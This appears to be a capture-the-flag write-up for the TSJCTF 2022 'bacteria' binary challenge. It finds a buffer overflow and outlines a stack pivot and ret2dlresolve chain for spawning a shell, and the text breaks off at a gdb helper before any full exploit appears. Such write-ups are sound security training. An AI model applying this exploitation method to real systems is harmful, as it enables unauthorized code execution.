<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png?v=2"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png?v=2"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png?v=2"/><link rel="manifest" href="/static/favicons/site.webmanifest?v=2"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg?v=2" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>TSJCTF 2022 – bacteria</title><meta name="robots" content="follow, index"/><meta name="description" content="Buffer overflow for shell."/><meta property="og:url" content="https://sekai.team/blog/tsjctf-2022/bacteria/"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Project SEKAI"/><meta property="og:description" content="Buffer overflow for shell."/><meta property="og:title" content="TSJCTF 2022 – bacteria"/><meta property="og:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=TSJCTF+2022+%E2%80%93+bacteria&amp;desc=Buffer+overflow+for+shell.&amp;authors=Johnathan"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/ProjectSEKAIctf"/><meta name="twitter:title" content="TSJCTF 2022 – bacteria"/><meta name="twitter:description" content="Buffer overflow for shell."/><meta name="twitter:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=TSJCTF+2022+%E2%80%93+bacteria&amp;desc=Buffer+overflow+for+shell.&amp;authors=Johnathan"/><meta property="article:published_time" content="2022-03-02T00:00:00.000Z"/><link rel="canonical" href="https://github.com/nhtri2003gmail/CTFNote/tree/master/writeup/2022/TSJ-CTF-2022/bacteria"/><link rel="canonical" href="https://sekai.team/blog/tsjctf-2022/bacteria/"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sekai.team/blog/tsjctf-2022/bacteria"
  },
  "headline": "TSJCTF 2022 – bacteria",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://og-vercel-ruby.vercel.app/api/sekai?title=TSJCTF+2022+%E2%80%93+bacteria&desc=Buffer+overflow+for+shell.&authors=Johnathan"
    }
  ],
  "datePublished": "2022-03-02T00:00:00.000Z",
  "dateModified": "2022-03-02T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Johnathan"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Project SEKAI",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sekai.team/static/images/fullLogo.svg"
    }
  },
  "description": "Buffer overflow for shell."
}</script><meta name="next-head-count" content="21"/><link rel="preload" href="/_next/static/css/206f24680f6266ec.css" as="style"/><link rel="stylesheet" href="/_next/static/css/206f24680f6266ec.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-09a75c9ee2bd415e.js" defer=""></script><script src="/_next/static/chunks/main-b8c3e234d7065a2c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8cbc7cb85baf88e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/29107295-a2d0c8e72019a3ed.js" defer=""></script><script src="/_next/static/chunks/545-f1dc6b53ce85b08b.js" defer=""></script><script src="/_next/static/chunks/930-1296a6163e1e3cc6.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-9a47024c9df525b8.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_buildManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_ssgManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_middlewareManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body class="antialiased text-black bg-white dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex flex-col justify-between h-screen"><header class="flex items-center justify-between py-10"><div><a aria-label="Visit home page" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 468.7 215.63" height="80" width="auto"><defs><linearGradient id="fullLogo_svg__linear-gradient" x1="-7051.74" y1="5608.42" x2="-7051.74" y2="5392.1" gradientTransform="matrix(1 0 .15 -.99 6503.98 5547.9)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00e5ea"></stop><stop offset="1" stop-color="#00b5cc"></stop></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-2" x1="1498.32" y1="4428.84" x2="1497.92" y2="4311.82" gradientTransform="matrix(1 0 0 -1 -1107.01 4435.41)" xlink:href="#fullLogo_svg__linear-gradient"></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-3" x1="320.76" y1="14.17" x2="320.76" y2="47.97" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0069a5"></stop><stop offset="1" stop-color="#003d6b"></stop></linearGradient><style>.fullLogo_svg__cls-1{fill:#fff}</style></defs><g id="fullLogo_svg__Project_SEKAI_Wide_White" data-name="Project SEKAI Wide White"><path class="fullLogo_svg__cls-1" d="M107 117.14v-4c11.93 0 22.15-8.62 23.76-20l12.91-91.63h4.06l-13 92.14c-1.92 13.4-13.84 23.49-27.73 23.49Z"></path><path class="fullLogo_svg__cls-1" d="M97.43 98.3a16 16 0 0 1-16.26-18.72l8.68-61.42A21.78 21.78 0 0 1 110.77 0a16.34 16.34 0 0 1 12.57 5.5A16.36 16.36 0 0 1 127 18.72l-8.69 61.42c-1.39 10.01-10.77 18.16-20.88 18.16ZM110.77 4a17.63 17.63 0 0 0-17 14.72l-8.64 61.42a12 12 0 0 0 12.3 14.16 17.65 17.65 0 0 0 16.95-14.72l8.69-61.42a12.41 12.41 0 0 0-2.75-10A12.4 12.4 0 0 0 110.77 4ZM186.94 5.42l.56-3.91H162.99l-13.5 95.44H174l.57-4h-20.46l5.85-41.36h20.46l.56-4h-20.45l5.96-42.17h20.45zM266.73 1.51h-31.01l-.55 3.91h14.2l-12.95 91.53h4.06l12.93-91.53h12.77l.55-3.91zM212.61 1.51a15.86 15.86 0 0 0-15.24 13.24l-9.86 69.48a11.69 11.69 0 0 0 2.76 9.34 12.57 12.57 0 0 0 9.18 4.43h.2c6.38 0 11.65-5.57 15.15-9.28L211.9 86c-3.06 3.23-7.67 8.11-12.38 8a8.54 8.54 0 0 1-6.21-3 7.73 7.73 0 0 1-1.84-6.18l9.86-69.48a11.83 11.83 0 0 1 11.28-9.9h13.91l.55-3.91ZM37.08 5.58a12 12 0 0 0-9.26-4.06H13.5L0 97h4.06l6.41-45.37h10.84a15.87 15.87 0 0 0 15.24-13.29l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.26 23a11.74 11.74 0 0 1-11.27 9.8H11l6-42.13h10.85a7.94 7.94 0 0 1 8 9.33ZM75.09 5.58a12 12 0 0 0-9.26-4.06h-14.3L38 97h4l6.5-45.42h10L65 96.2h4l-6.6-45a16 16 0 0 0 12.16-12.86l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.25 23a11.76 11.76 0 0 1-11.28 9.8H49.07L55 5.42h10.86a7.94 7.94 0 0 1 8 9.33ZM223.75 215.47h-4.06l13.5-95.43h4.05l-13.49 95.43zM65.83 215.63a14.49 14.49 0 0 1-11-4.65 11.3 11.3 0 0 1-2.68-9.15l1.31-8.59 4.4-2.34-1.76 11.52a7.24 7.24 0 0 0 1.75 5.93 10.47 10.47 0 0 0 8 3.28c6.42 0 12.26-4.39 13-9.8l5.42-38.33-28.77 15.27 6.37-46c1-7.3 8.65-13.24 17-13.24a14.52 14.52 0 0 1 11 4.65 11.36 11.36 0 0 1 2.68 9.14l-1.2 8.68-4.35 2.34 1.64-11.6a7.29 7.29 0 0 0-1.74-6 10.5 10.5 0 0 0-8-3.28c-6.42 0-12.26 4.39-13 9.79l-5.29 38.27 28.8-15.28-6.52 46.1c-1.11 7.35-8.73 13.29-17.06 13.29ZM174.15 120.04h-4.51l-26.9 51.72 7.31-51.72H146l-13.5 95.43h4.05l4.5-31.8 10.61-20.4 12.61 52.2h4.11l-13.91-57.6 19.68-37.83zM205 215.47h4l-2.29-94.87v-.56h-4l-29.31 95.43h4.18l9.82-32h16.83Zm-16.37-36L203 132.68l1.13 46.81ZM132.58 123.94l.56-3.91h-24.52l-13.49 95.44h24.51l.56-4H99.75l5.85-41.36h20.45l.57-4h-20.46l5.97-42.17h20.45z"></path><path style="fill:url(#fullLogo_svg__linear-gradient)" d="M279.69 1.51h8.87l-32.09 213.93h-8.87L279.69 1.51z"></path><path d="M393.81 14.88C396 .34 331.4 1.5 296.53 1.5L283.6 87.67c33.36-1.94 99.5-2 97.21 13.27-1.14 7.58-5.53 7.29-6.1 11.08-1.52 10.14 70.94 5.62 81.15 4.52L434 73.6l34.7-43.29c-17.47 1.81-82.47 4.94-81.11-4.15.73-4.87 5.41-5.56 6.22-11.28Z" style="fill:url(#fullLogo_svg__linear-gradient-2)"></path><path d="m324.34 13-5.8 25.24A9.73 9.73 0 0 0 312 36c-4.66 0-8.43 2.82-8.42 6.27s3.8 6.24 8.46 6.22c4 0 7.4-2.12 8.23-4.92 0-.14.06-.28.09-.42l3.48-15.5q9.18 2.06 9.72 5.26a9 9 0 0 1-1.27 6.22 10.78 10.78 0 0 0 5.7-8.81q.48-5.88-13.65-17.32Z" style="fill:url(#fullLogo_svg__linear-gradient-3)"></path></g></svg></div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/members/">Members</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/contests/">Contests</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/blog/">Blog</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/tags/">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100">CTF 2023</a></div><div class="sm:hidden"><button type="button" class="w-8 h-8 py-1 ml-1 mr-1 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed w-full h-full top-24 right-0 bg-gray-200 dark:bg-gray-800 opacity-95 z-10 transform ease-in-out duration-300 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed w-full h-full cursor-auto focus:outline-none"></button><nav class="fixed h-full mt-8"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/members/">Members</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/contests/">Contests</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog/">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags/">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100">CTF 2023</a></div></nav></div></div></div></header><main class="mb-auto"><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2022-03-02T00:00:00.000Z">Wednesday, 2 March 2022</time></dd></div></dl><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">TSJCTF 2022 – bacteria</h1></div></div></header><div class="pb-8 divide-y divide-gray-200 xl:divide-y-0 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:pt-11 xl:border-b xl:border-gray-200 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 xl:block sm:space-x-12 xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><img src="https://www.gravatar.com/avatar/aa9cc3f27f3b1f3c47841d62f18c039f?d=identicon&amp;s=256" width="38px" height="38px" alt="avatar" class="w-10 h-10 rounded-full"/><dl class="text-sm font-medium leading-5 whitespace-nowrap"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">Johnathan</dd><dt class="sr-only">Twitter</dt><dd><a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail" class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400">@nhtri2003gmail</a></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:pb-0 xl:col-span-3 xl:row-span-2"><div class="pt-10 pb-8 prose dark:prose-dark max-w-none"><h2 id="bacteria"><a href="#bacteria" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>bacteria</h2>
<ul><li class="false"><a href="#1-find-bug">1. Find bug</a></li><li class="false"><a href="#2-brainstorming">2. Brainstorming</a></li><li class="false"><a href="#3-exploit">3. Exploit</a></li><li class="ml-6"><a href="#stage-1-stack-pivot">Stage 1: Stack pivot</a></li><li class="ml-6"><a href="#stage-2-fake-address-and-structure-of-elf64_sym">Stage 2: Fake address and structure of Elf64_Sym</a></li><li class="ml-6"><a href="#stage-3-fake-address-and-structure-of-elf64_rela">Stage 3: Fake address and structure of Elf64_Rela</a></li><li class="ml-6"><a href="#stage-4-fake-address-and-structure-of-strtab">Stage 4. Fake address and structure of STRTAB</a></li><li class="ml-6"><a href="#stage-5-conduct-ret2dlresolve--leak-libc-address">Stage 5. Conduct ret2dlresolve &amp; Leak libc address</a></li><li class="ml-6"><a href="#stage-6-get-shell">Stage 6. Get shell</a></li><li class="false"><a href="#4-get-flag">4. Get flag</a></li></ul>
<p>Origin challenge link: <a target="_blank" rel="noopener noreferrer" href="https://chal.ctf.tsj.tw/">https://chal.ctf.tsj.tw/</a> (closed)</p>
<p>You can also download challenge file in repo: <a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/TSJ-CTF-2022/bacteria/bacteria.tar.gz">bacteria.tar.gz</a></p>
<p>There will be several files in tar as follows:</p>
<ul>
<li>bacteria/docker-compose.yml</li>
<li>bacteria/Dockerfile</li>
<li>bacteria/xinetd</li>
<li>bacteria/share</li>
<li>bacteria/share/bacteria</li>
<li>bacteria/share/flag</li>
<li>bacteria/share/getflag</li>
<li>bacteria/share/run.sh</li>
</ul>
<p>Download the tar and untar it, then build with the following command (require <a target="_blank" rel="noopener noreferrer" href="https://docs.docker.com/compose/install/">docker-compose</a>):</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">docker-compose build &amp;&amp; docker-compose up
</span></code></pre></div>
<p>And now we’re ready for the exploitation!</p>
<h2 id="1-find-bug"><a href="#1-find-bug" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>1. Find bug</h2>
<p>First, we will use <code>file</code> to check for basic information (outside docker container):</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ <span class="token function">file</span> bacteria
</span><span class="code-line">bacteria: ELF <span class="token number">64</span>-bit LSB executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped
</span></code></pre></div>
<p>So this is a 64-bit file being stripped, it will be hard when we need to debug. Next, we will use <code>checksec</code> to check for all defences:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ checksec bacteria
</span><span class="code-line">    Arch:     amd64-64-little
</span><span class="code-line">    RELRO:    Partial RELRO
</span><span class="code-line">    Stack:    No canary found
</span><span class="code-line">    NX:       NX enabled
</span><span class="code-line">    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</span></code></pre></div>
<p>Nice! We can see that just <code>NX enabled</code> which means we cannot execute assembly shellcode on stack. Finally, we will use <code>objdump</code> to dump the assembly code of file.</p>
<p>This is a small binary with just a few assembly code as below:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/objdump.png" alt="objdump.png"/></p>
<p>So we have <code>read@plt</code>, <code>read@got</code> and <code>.text</code> part. In <code>.text</code>, it first read in 0x20 byte to the current rsp and then set the null byte after that input. Finally it add rsp with 0x10 and return.</p>
<p>So that’s means we have the <strong>Buffer Overflow</strong> bug and that’s all, we cannot find anything else. So let’s move on the next part: Brainstorming!</p>
<h2 id="2-brainstorming"><a href="#2-brainstorming" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>2. Brainstorming</h2>
<p>First, we have the <strong>Buffer Overflow</strong> bug but because the space for our payload is too small so I intent to do a stack pivot first. But the challenge file has <code>NX enabled</code> so we cannot execute assembly shellcode on it. Also because the binary is small, we don’t have any gadget to conduct a full ROPgadget or even just a part of ROPgadget.</p>
<p>But we have <code>read@plt</code>, which means it will need to resolve the libc address for the first time. So we have the dlresolver function, all we need now is a <code>ret2dlresolve</code>. If you don’t know what it is, you can read <a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail/ret2dlresolve-64bit">here</a>.</p>
<p>First, this is a 64-bit file so using <code>ret2dlresolve</code> technique may work and may not work for some special case. And we can conduct this technique by 2 ways: faking <code>link_map</code> or faking <code>reloc_arg</code></p>
<p>In this challenge, I know that we can fake <code>reloc_arg</code> because the base address of binary is <code>0x400000</code> so <code>ret2dlresolve</code> will not cause error (if base address is <code>0x600000</code>, the check function of dlresolver will cause error), also because we don’t have any thing to leak <code>link_map</code> and to overwrite <code>link_map</code> data.</p>
<p>So first, we will try to fake some structures to conduct <code>ret2dlresolve</code> to execute whatever function we want. Next, we will try to leak the libc address and then use one gadget to get shell.</p>
<ul>
<li>Summary:<!-- -->
<ol>
<li>Fake structure of Elf64_Sym</li>
<li>Fake structure of Elf64_Rela</li>
<li>Fake STRTAB</li>
<li>Conduct ret2dlresolve</li>
<li>Get shell</li>
</ol>
</li>
</ul>
<h2 id="3-exploit"><a href="#3-exploit" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>3. Exploit</h2>
<p>Before we continue our exploit, I write this function to attach gdb to the process of bacteria:</p>
<details><summary>Code snippet</summary><p><div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token keyword">def</span> <span class="token function">GDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">	proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#x27;ps&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;aux&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
</span><span class="code-line">	ps <span class="token operator">=</span> proc<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b&#x27;\n&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">	pid <span class="token operator">=</span> <span class="token string">&#x27;&#x27;</span>
</span><span class="code-line">	<span class="token keyword">for</span> i <span class="token keyword">in</span> ps<span class="token punctuation">:</span>
